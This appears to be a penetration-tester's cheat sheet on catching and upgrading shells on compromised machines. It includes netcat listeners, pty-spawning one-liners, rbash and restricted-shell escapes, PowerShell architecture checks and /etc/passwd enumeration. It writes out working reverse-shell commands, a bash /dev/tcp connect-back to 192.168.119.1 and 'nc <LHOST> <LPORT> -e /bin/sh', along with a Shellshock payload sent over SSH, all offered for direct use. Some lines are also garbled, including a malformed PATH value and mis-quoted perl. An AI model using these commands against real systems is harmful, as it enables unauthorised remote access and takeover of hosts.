Upgrading and Improving Shells
Tricks to improve a crappy shell

rlwrap
$ rlwrap -r nc -nvlp 443

Upgrading Shells

Upgrade sh to bash using python (2 or 3)
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

Correcting the $PATH variable for sh / bash
$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:/bin

Upgrading from rbash:
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/

Start bash instance:
$ /bin/bash -i >& /dev/tcp/192.168.119.1/80 0>&1
$ /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.119.1/80 0>&1'

Check Architecture of a PowerShell connection
~ 	32 bit folder 	64 bit folder
32-bit session 	C:\Windows\system32\ 	C:\Windows\sysNative
64-bit session 	C:\Windows\sysWOW64\ 	C:\Windows\system32

Check architecture of the host
$ [system.environment]::Is64BitOperatingSystem

Check architecture of powershell environment:
$ [Environment]::Is64BitProcess

alternative to check arch in ps environment:
$ [IntPtr]::Size
The value of this property is 4 in a 32-bit process, and 8 in a 64-bit process.

For example: If you get a shell trough a webserver running in a 32bit process but the host is 64bit, powershell will by default open a 32bit process.
This can be solved by specifically calling powershell with the following path:
C:\Windows\sysNative\WindowsPowerShell\v1.0\powershell.exe

More info:
https://ss64.com/nt/syntax-64bit.html




# Usage 
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'

# Additional Functionality
CTRL + Z
stty raw -echo; fg
enter
export TERM=xterm-256color

# Run older python/python2 scripts in virtual environment:
cd /opt/impacket
sudo virtualenv impacket-venv -p $(which python2)
source impacket-venv/bin/activate

# Exit virtual environment
deactivate

python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
perl -e ‘`/bin/bash`’
perl -e 'exec "/bin/bash";'
echo os.system('/bin/bash')
/bin/sh -i

Spawn Lua TTY Shell
os.execute('/bin/sh')

Spawn TTY Shell from Vi
Run shell commands from vi:
:!bash

Spawn TTY Shell NMAP
!sh

Format /etc/passwd
for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done
cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk '{print$1}'

Spawn TTY Shell
In order to catch a shell, you need to listen on the desired port. rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].
rlwrap nc 10.0.0.1 4242
rlwrap -r nc -nvlp 443

rlwrap -r -f . nc 10.0.0.1 4242
-f . will make rlwrap use the current history file as a completion word list.
-r Put all words seen on in- and output on the completion list.


use SSH on your machine to execute commands before the shell is loaded:
ssh user@server -t "/bin/sh"

or start the shell without loading "rc" profice (where most limits are configured):
ssh user@server -t "bash --noprofile"

SSH Shellshock
try ShellShock on vulnerable implementations
ssh user@server -t "() { :; }; /bin/bash"

try to execute other commands such as nc to get full shell
ssh user@server nc <LHOST> <LPORT> -e /bin/sh

